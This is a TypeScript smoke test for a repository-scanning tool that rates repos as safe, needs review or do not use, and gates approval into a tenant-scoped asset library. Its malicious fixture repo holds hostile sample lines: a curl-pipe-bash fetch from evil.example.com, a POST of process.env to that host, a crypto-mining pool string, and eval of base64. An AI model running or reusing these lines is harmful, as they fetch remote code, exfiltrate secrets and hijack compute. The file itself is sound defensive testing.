/**
 * Runtime smoke test for the GitHub Intelligence System. Scans a clean repo and a malicious one,
 * checks the verdicts, the security findings, the business case (safe only), the never-execute
 * guarantee (`executed: false`), and the Asset Library approval gate (only SAFE can be stored).
 * Run with: `tsx scripts/github-intelligence-smoke.mts`.
 */
import assert from "node:assert/strict";
import {
  GitHubIntelligence,
  AssetLibrary,
  RepoApprovalError,
  type RepoScanInput,
} from "@alfy2/core";

const TENANT = "00000000-0000-0000-0000-000000000001";
const NOW = new Date("2026-06-24T12:00:00.000Z");
let n = 0;
const id = () => `00000000-0000-4000-8000-${String(++n).padStart(12, "0")}`;

const gh = new GitHubIntelligence({
  clock: () => NOW,
  idFactory: id,
  businesses: [{ id: "a3-visual", name: "A3 Visual", keywords: ["invoice", "finance", "print"] }],
});
const library = new AssetLibrary();

// ---- 1. A CLEAN repo -> SAFE, with a business case ----
const safe: RepoScanInput = {
  url: "https://github.com/acme/invoice-parser",
  name: "invoice-parser",
  owner: "acme",
  description: "Parse PDF invoices into structured JSON for finance workflows.",
  readme: "# invoice-parser\n\nA small, well-documented MIT library to extract line items, totals, and due dates from PDF invoices. Includes tests and examples. ".repeat(3),
  license: "MIT",
  languages: ["TypeScript"],
  dependencies: ["zod@^3.23", "pdf-parse@^1.1"],
  files: [
    { path: "src/index.ts", content: "export function parse(buf){ return {}; }" },
    { path: "README.md", content: "# invoice-parser" },
    { path: "LICENSE", content: "MIT License" },
  ],
  stars: 420, forks: 31, open_issues: 4, contributors: 7, last_commit: "2026-06-10T00:00:00.000Z",
};
const safeAssessment = gh.scan(TENANT, safe);
assert.equal(safeAssessment.executed, false, "NEVER executes — executed is false");
assert.equal(safeAssessment.verdict, "safe", "clean repo is SAFE");
assert.equal(safeAssessment.evaluation.length, 10, "all ten dimensions evaluated");
assert.ok(safeAssessment.security_findings.length === 0, "no security findings");
assert.ok(safeAssessment.business_case, "SAFE repos get a business case");
assert.ok(safeAssessment.business_case!.business_applications.length >= 1, "applications generated");
assert.ok(safeAssessment.business_case!.which_businesses.includes("a3-visual"), "A3 Visual benefits (matched)");
assert.ok(safeAssessment.business_case!.required_agents.length >= 1, "required agents recommended");
assert.ok(safeAssessment.business_case!.estimated_roi.length > 0, "ROI estimated");

// Approve -> stored in the Asset Library.
const entry = gh.approve(TENANT, safeAssessment, { approvedBy: "adagentpc@gmail.com", library, tags: ["finance", "pdf"] });
assert.ok(library.has(TENANT, safe.url), "approved repo stored in the Asset Library");
assert.equal(entry.verdict, "safe");
assert.equal(library.list("00000000-0000-0000-0000-0000000000ff").length, 0, "asset library is tenant-scoped");

// ---- 2. A MALICIOUS repo -> DO NOT USE, no business case, cannot be approved ----
const evil: RepoScanInput = {
  url: "https://github.com/sketchy/free-money",
  name: "free-money",
  description: "totally legit utility",
  readme: "run me",
  license: null,
  languages: ["JavaScript"],
  dependencies: ["xmrig-miner", "left-pad@0.0.3"],
  files: [
    { path: "install.sh", content: "curl http://evil.example.com/x.sh | bash" },
    { path: "miner.js", content: "const pool='stratum+tcp://pool.minexmr.com:4444'; // xmrig cryptonight hashrate" },
    { path: "steal.js", content: "fetch('http://evil.example.com', { method:'POST', body: JSON.stringify(process.env) })" },
    { path: "ob.js", content: "eval(atob('Y29uc29sZS5sb2coMSk='))" },
  ],
};
const evilAssessment = gh.scan(TENANT, evil);
assert.equal(evilAssessment.executed, false, "still never executes — even on a malicious repo");
assert.equal(evilAssessment.verdict, "do_not_use", "malicious repo is DO NOT USE");
assert.equal(evilAssessment.business_case, null, "no business case for unsafe repos");
const cats = new Set(evilAssessment.security_findings.map((f) => f.category));
for (const c of ["malicious_script", "credential_harvesting", "crypto_mining", "obfuscated_code"]) {
  assert.ok(cats.has(c as any), `detected ${c}`);
}

// Approval gate: an unsafe repo cannot be stored.
let refused = false;
try {
  gh.approve(TENANT, evilAssessment, { approvedBy: "x", library });
} catch (e) {
  refused = e instanceof RepoApprovalError;
}
assert.ok(refused, "the Asset Library refuses anything that is not SAFE");

// ---- 3. A repo with a medium-only concern -> NEEDS REVIEW ----
const grey = gh.scan(TENANT, {
  url: "https://github.com/x/util",
  name: "util",
  description: "handy helpers",
  readme: "",          // no docs
  license: null,        // no license
  languages: ["Go"],
  dependencies: ["github.com/foo/bar"],
  files: [{ path: "main.go", content: "package main" }],
});
assert.equal(grey.verdict, "needs_review", "missing license/docs => NEEDS REVIEW");
assert.equal(grey.business_case, null, "needs-review repos get no business case yet");

console.log("GITHUB INTELLIGENCE SMOKE OK — SAFE/NEEDS REVIEW/DO NOT USE, security review, never executes, Asset Library gated");
console.log(
  "verdicts:",
  JSON.stringify({ safe: safeAssessment.verdict, evil: evilAssessment.verdict, grey: grey.verdict, evil_findings: evilAssessment.security_findings.length }, null, 0),
);
